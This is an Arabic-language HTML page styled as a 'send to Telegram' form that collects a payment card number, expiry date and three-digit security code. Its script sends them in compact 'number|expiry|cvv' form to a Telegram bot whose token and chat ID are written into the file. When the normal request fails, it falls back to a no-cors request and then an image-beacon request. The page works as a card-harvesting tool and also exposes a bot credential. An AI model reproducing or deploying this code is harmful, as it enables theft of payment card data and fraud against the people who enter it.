<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تطبيق إرسال إلى تلجرام — معاينة رسمية</title>

  <meta name="color-scheme" content="light">
  <style>
    :root{
      --bg: #f6f9fc;
      --panel: #ffffff;
      --muted: #6b7280;
      --accent-1: #06b6d4; /* teal */
      --accent-2: #3b82f6; /* blue */
      --accent-3: #8b5cf6; /* purple accent */
      --success: #059669;
      --danger: #ef4444;
      --card-height: 220px;
      --radius-app: 16px;
      --shadow-lg: 0 18px 40px rgba(15,23,42,0.08);
      --shadow-sm: 0 8px 20px rgba(15,23,42,0.06);
      --glass: rgba(11,18,30,0.02);
      --text: #08203a;
    }

    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale}
    body{
      background:
        radial-gradient(600px 260px at 10% 10%, rgba(59,130,246,0.06), transparent),
        linear-gradient(180deg, #f0f6fb 0%, var(--bg) 100%);
      color:var(--text);
      padding:28px;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      direction:rtl;
    }

    /* App container */
    .app {
      width:100%;
      max-width:980px;
      border-radius:var(--radius-app);
      overflow:hidden;
      display:grid;
      grid-template-columns: 1fr 420px;
      gap:22px;
      padding:18px;
      align-items:start;
    }
    @media (max-width:920px){
      .app { grid-template-columns: 1fr; padding:14px; gap:14px; }
      .right { order:-1; }
    }

    /* Left panel (form) */
    .panel {
      background:var(--panel);
      border-radius:12px;
      padding:18px;
      border:1px solid rgba(11,18,30,0.04);
      box-shadow: var(--shadow-lg);
    }

    .brand {
      display:flex;
      gap:12px;
      align-items:center;
      margin-bottom:12px;
    }
    .logo {
      width:52px;height:52px;border-radius:12px;
      background: linear-gradient(135deg,var(--accent-1),var(--accent-2));
      display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;
      box-shadow: var(--shadow-sm);
      flex-shrink:0;
    }
    .brand h1{margin:0;font-size:18px}
    .brand p{margin:0;color:var(--muted);font-size:13px}

    form { display:flex; flex-direction:column; gap:14px; }

    .field { display:flex; flex-direction:column; gap:8px; }
    label.inline { font-weight:700; color:var(--text); font-size:13px; display:flex; gap:8px; align-items:center; }

    .input {
      display:flex; align-items:center; gap:10px;
      background:var(--glass); padding:12px; border-radius:10px;
      border:1px solid rgba(11,18,30,0.04); transition:box-shadow .12s, transform .08s;
    }
    .input:focus-within { box-shadow:0 12px 30px rgba(59,130,246,0.06); transform: translateY(-2px); border-color: rgba(59,130,246,0.12); }

    input[type="text"], input[type="tel"]{
      border:0; background:transparent; outline:none; width:100%; font-size:16px; color:var(--text);
      direction:ltr; text-align:left;
    }
    input::placeholder { color: rgba(8,32,58,0.35); }

    .two-cols { display:flex; gap:12px; }
    .two-cols > div { flex:1; }

    .hint { font-size:12px; color:var(--muted); margin-top:6px; }

    .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
    button.btn {
      padding:12px 16px; border-radius:12px; cursor:pointer; border:0; font-weight:700; font-size:15px;
    }
    button.primary {
      background: linear-gradient(90deg,var(--accent-2),var(--accent-3));
      color:white; box-shadow: 0 10px 28px rgba(99,102,241,0.10);
      transition: transform .12s;
    }
    button.primary:active{ transform: translateY(-1px); }
    button.ghost {
      background:transparent; border:1px solid rgba(11,18,30,0.06); color:var(--muted); padding:10px 12px; border-radius:10px;
    }

    #message { min-height:26px; font-size:14px; color:var(--muted); }
    #message.info { color:var(--accent-2); }
    #message.success { color:var(--success); }
    #message.error { color:var(--danger); }

    .note{ font-size:13px;color:var(--muted); margin-top:8px; background:rgba(11,18,30,0.02); padding:10px;border-radius:10px; }

    /* Right column: preview */
    .right { padding:18px; border-radius:12px; display:flex; flex-direction:column; gap:12px; }
    .right .panel { padding:14px; border-radius:12px; }

    .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
    .preview-header h3 { margin:0; font-size:16px; }
    .preview-desc { font-size:13px; color:var(--muted); }

    .card-preview {
      height: var(--card-height); border-radius:12px; overflow:hidden; position:relative;
      padding:18px; display:flex; flex-direction:column; justify-content:space-between;
      background: linear-gradient(135deg, #ffffff, #fbfdff);
      border:1px solid rgba(11,18,30,0.03);
      box-shadow: 0 12px 30px rgba(11,18,30,0.04);
    }

    .card-surface {
      border-radius:10px; padding:16px; color:var(--text); display:flex; flex-direction:column; gap:10px;
      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.05));
      min-height:120px; border:1px solid rgba(11,18,30,0.02);
    }

    .card-top { display:flex; justify-content:space-between; align-items:center; }
    .chip { width:50px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: var(--shadow-sm); }

    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:var(--text); }
    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; color:var(--text); }
    .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
    .label { font-size:11px; color: rgba(4,6,12,0.6); }
    .value { font-weight:800; color:var(--text); }

    .controls { display:flex; gap:8px; align-items:center; }
    .small-ghost { background:transparent; border:1px solid rgba(11,18,30,0.06); padding:8px 10px; border-radius:10px; color:var(--muted); cursor:pointer; }

    .success-burst { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; opacity:0; transform:scale(0.98); transition:opacity .28s, transform .28s; }
    .success-burst.show { opacity:1; transform:scale(1); }
    .check { width:74px; height:74px; border-radius:50%; background:rgba(5,150,105,0.08); display:flex; align-items:center; justify-content:center; border:2px solid rgba(5,150,105,0.12); color:var(--success); font-size:36px; font-weight:800; }

    @media (max-width:520px){
      .card-number { font-size:18px; }
      .brand h1 { font-size:16px; }
      .card-surface { padding:12px; }
    }
  </style>
</head>
<body>
  <div class="app" role="application" aria-label="تطبيق إرسال إلى تلجرام">
    <!-- LEFT: Form -->
    <div class="panel" aria-labelledby="appTitle">
      <div class="brand">
        <div class="logo" aria-hidden>TB</div>
        <div>
          <h1 id="appTitle">نموذج إرسال إلى تلجرام</h1>
          <p>واجهة فاتحة متناسقة — البيانات تظهر فوراً في البطاقة الرسمية على اليمين.</p>
        </div>
      </div>

      <form id="form" autocomplete="on" novalidate>
        <!-- Card number (LTR input even on RTL page) -->
        <div class="field">
          <label class="inline">رقم البطاقة (16 رقم)</label>
          <div class="input" title="أدخل 16 رقمًا">
            <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                   placeholder="0000 0000 0000 0000" aria-describedby="idHint" dir="ltr" />
          </div>
          <div id="idHint" class="hint">الكتابة تكون من اليسار إلى اليمين — يتم تنسيق الأرقام تلقائياً بمجموعات من 4.</div>
        </div>

        <div class="two-cols">
          <div class="field">
            <label class="inline">تاريخ الانتهاء (MM/YY أو MM/YYYY)</label>
            <div class="input">
              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY أو MM/YYYY" maxlength="7" autocomplete="cc-exp" />
            </div>
            <div class="hint">مثال: 01/28 أو 01/2028</div>
          </div>

          <div class="field">
            <label class="inline">الرقم (3 خانات)</label>
            <div class="input">
              <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
            </div>
            <div class="hint">مثال: 123</div>
          </div>
        </div>

        <div class="actions" style="align-items:center">
          <button class="btn primary" id="sendBtn" type="submit">إرسال</button>
          <button type="button" class="ghost" id="clearBtn">مسح</button>
          <div id="message" role="status" aria-live="polite" style="flex:1;text-align:left"></div>
        </div>

        <p class="note">تنبيه: التوكن و chat_id مضمّنان داخل هذا الملف — هذا غير آمن إن رفعته في موقع عام. استعمله محليًا أو غيّر التوكن لاحقاً.</p>
      </form>
    </div>

    <!-- RIGHT: Preview -->
    <div class="right">
      <div class="panel">
        <div class="preview-header">
          <div>
            <h3>معاينة رسمية للبطاقة</h3>
            <div class="preview-desc">المعلومات تظهر بطريقة رسمية ومنسقة على البطاقة — هذه هي القيم التي سيتم إرسالها.</div>
          </div>
          <div class="controls">
            <button id="toggleMask" class="small-ghost" title="عرض/إخفاء الرقم">إظهار الرقم</button>
            <button id="copyBtn" class="small-ghost" title="نسخ نص الإرسال">نسخ</button>
          </div>
        </div>
      </div>

      <div class="card-preview" role="region" aria-label="معاينة البطاقة">
        <div class="card-surface" id="cardSurface" role="img" aria-label="بطاقة المعاينة">
          <div class="card-top">
            <div class="chip" aria-hidden></div>
            <div style="font-weight:700;color:var(--text)">Telegram</div>
          </div>

          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr">•••• •••• •••• ••••</div>

          <div class="card-meta">
            <div class="meta-block">
              <div class="label">تاريخ الانتهاء</div>
              <div class="value" id="cardExpiry">MM/YY</div>
            </div>
            <div class="meta-block">
              <div class="label">الرقم (3)</div>
              <div class="value" id="cardThree">•••</div>
            </div>
          </div>
        </div>

        <div class="success-burst" id="successBurst" aria-hidden="true">
          <div class="check" aria-hidden>✓</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    /************************************************
     * إعداد التوكن والـ chat id هنا (كما طلبت)
     * تذكير: ظهورهما في الكود يجعلانهما مكشوفين.
     ************************************************/
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";

    // Elements
    const form = document.getElementById('form');
    const idInput = document.getElementById('idNumber');
    const expiryInput = document.getElementById('expiry');
    const threeInput = document.getElementById('threeDigits');
    const msg = document.getElementById('message');
    const sendBtn = document.getElementById('sendBtn');
    const clearBtn = document.getElementById('clearBtn');

    const pNumber = document.getElementById('cardNumber');
    const pExpiry = document.getElementById('cardExpiry');
    const pThree = document.getElementById('cardThree');
    const successBurst = document.getElementById('successBurst');
    const toggleMask = document.getElementById('toggleMask');
    const copyBtn = document.getElementById('copyBtn');

    // state
    let maskEnabled = true; // start masked
    toggleMask.textContent = maskEnabled ? 'إظهار الرقم' : 'إخفاء الرقم';

    // Helpers
    function showMessage(text, cls='info') {
      msg.className = cls;
      msg.textContent = text;
    }

    function rawDigits(v='') {
      return (v||'').toString().replace(/\D/g, '');
    }

    // Format card number into groups of 4
    function formatCardGroups(digits) {
      const parts = digits.match(/.{1,4}/g) || [];
      return parts.join(' ');
    }

    // Input handling: card number (LTR)
    idInput.addEventListener('input', (e) => {
      const cur = e.target.value;
      const digits = rawDigits(cur).slice(0,16);
      e.target.value = formatCardGroups(digits);
      // keep caret at end for convenience
      try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch (_) {}
      updatePreview();
    });

    // Expiry input accepts MMYY / MM/YY / MMYYYY / MM/YYYY
    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/[^\d]/g,'').slice(0,6);
      if (v.length <= 2) {
        e.target.value = v;
      } else if (v.length <= 4) {
        // MMYY -> MM/YY
        e.target.value = v.slice(0,2) + '/' + v.slice(2);
      } else {
        // MMYYYY -> MM/YYYY
        e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
      }
      updatePreview();
    });

    // Three digits input
    threeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
      updatePreview();
    });

    // Toggle mask behavior
    toggleMask.addEventListener('click', () => {
      maskEnabled = !maskEnabled;
      toggleMask.textContent = maskEnabled ? 'إظهار الرقم' : 'إخفاء الرقم';
      updatePreview();
    });

    // Copy compact message to clipboard (compact: id|MM/YYYY|cvv)
    copyBtn.addEventListener('click', async () => {
      const txt = buildSendText();
      try {
        await navigator.clipboard.writeText(txt);
        showMessage('تم نسخ نص الإرسال.', 'success');
        setTimeout(()=> showMessage('', ''), 1600);
      } catch (e) {
        showMessage('فشل النسخ — ربما لا يدعم المتصفح.', 'error');
      }
    });

    // Build message to send: compact (no labels)
    function buildSendText() {
      const id = rawDigits(idInput.value);
      const exp = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
      const cvv = threeInput.value || '';
      return `${id}|${exp}|${cvv}`;
    }

    // Normalize expiry to MM/YYYY for sending
    function normalizeExpiryForSend(display) {
      if (!display) return '';
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return display;
      const mm = m[1];
      const yy = m[2];
      if (yy.length === 2) {
        return `${mm}/${String(2000 + parseInt(yy,10))}`;
      } else {
        return `${mm}/${yy}`;
      }
    }

    // Validation helpers
    function validateId() {
      return /^\d{16}$/.test(rawDigits(idInput.value));
    }
    function validateExpiry() {
      const val = expiryInput.value;
      if (!val) return false;
      const m = val.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return false;
      const mm = parseInt(m[1],10);
      const yy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
      if (mm < 1 || mm > 12) return false;
      const last = new Date(yy, mm, 0, 23, 59, 59);
      return last > new Date();
    }
    function validateThree() {
      return /^\d{3}$/.test(threeInput.value);
    }

    // Masking for preview: show last 4 digits only when masked
    function maskedDisplay(displayVal) {
      const digits = rawDigits(displayVal);
      if (!digits) return '•••• •••• •••• ••••';
      const padded = (digits + '                ').slice(0,16); // ensure length
      const groups = padded.match(/.{1,4}/g) || [];
      if (!maskEnabled) return groups.join(' ');
      return groups.map((g, i) => i < 3 ? g.replace(/\d/g,'•') : g).join(' ');
    }

    // Update preview (card)
    function updatePreview() {
      pNumber.textContent = maskedDisplay(idInput.value);
      // show expiry short (MM/YY) on card for compactness
      const exp = expiryInput.value || 'MM/YY';
      // if user typed YYYY, convert to short if possible
      const m = exp.match(/^(\d{2})\/(\d{2,4})$/);
      if (m) {
        const mm = m[1];
        const y = m[2].length === 4 ? m[2].slice(-2) : m[2];
        pExpiry.textContent = `${mm}/${y}`;
      } else {
        pExpiry.textContent = exp;
      }
      pThree.textContent = threeInput.value ? threeInput.value.replace(/./g,'•') : '•••';
    }

    // Initialize preview
    updatePreview();

    // Keep caret at end for LTR input convenience
    idInput.addEventListener('focus', () => { setTimeout(()=> { try { idInput.selectionStart = idInput.selectionEnd = idInput.value.length; } catch(_){} }, 0); });

    // Clear form
    clearBtn.addEventListener('click', () => {
      form.reset();
      maskEnabled = true;
      toggleMask.textContent = 'إظهار الرقم';
      showMessage('', '');
      updatePreview();
    });

    // Send logic (same fallback as before)
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      showMessage('', '');
      // Validate
      if (!validateId()) {
        showMessage('الرجاء إدخال 16 رقمًا للبطاقة.', 'error');
        return;
      }
      if (!validateExpiry()) {
        showMessage('الرجاء إدخال تاريخ صالح (MM/YY أو MM/YYYY) ويجب أن يكون في المستقبل.', 'error');
        return;
      }
      if (!validateThree()) {
        showMessage('الرجاء إدخال 3 أرقام في الحقل المخصص.', 'error');
        return;
      }

      const text = buildSendText(); // compact form: id|MM/YYYY|cvv
      const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      });
      const url = `${base}?${params.toString()}`;

      showMessage('جاري الإرسال...', 'info');
      sendBtn.disabled = true;
      sendBtn.style.opacity = '0.7';

      // 1) normal fetch
      try {
        const resp = await fetch(url, { method: 'GET' });
        if (resp && resp.ok) {
          const j = await resp.json();
          if (j.ok) {
            showMessage('تم الإرسال بنجاح.', 'success');
            triggerSuccess();
            form.reset();
            updatePreview();
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          } else {
            showMessage('تلجرام أعاد خطأ: ' + (j.description || JSON.stringify(j)), 'error');
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          }
        }
      } catch (err) {
        console.warn('fetch normal failed, will try fallback methods.', err);
      }

      // 2) no-cors fetch
      try {
        await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        showMessage('تم إرسال الطلب (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.warn('fetch no-cors failed, trying image fallback.', err);
      }

      // 3) image fallback
      try {
        await new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve(true);
          img.onerror = () => resolve(true);
          img.src = url + "&_=" + Date.now();
          setTimeout(() => resolve(true), 4000);
        });
        showMessage('تم إرسال الطلب (عن طريق طريقة بديلة).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.error(err);
        showMessage('فشل الإرسال — تحقق من الاتصال أو إعدادات المتصفح.', 'error');
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
      }
    });

    // Success visual
    function triggerSuccess() {
      successBurst.classList.add('show');
      successBurst.setAttribute('aria-hidden','false');
      setTimeout(() => {
        successBurst.classList.remove('show');
        successBurst.setAttribute('aria-hidden','true');
      }, 1500);
    }

    // Live updates also on keyboard
    [idInput, expiryInput, threeInput].forEach(el => el.addEventListener('keyup', updatePreview));
  </script>
</body>
</html>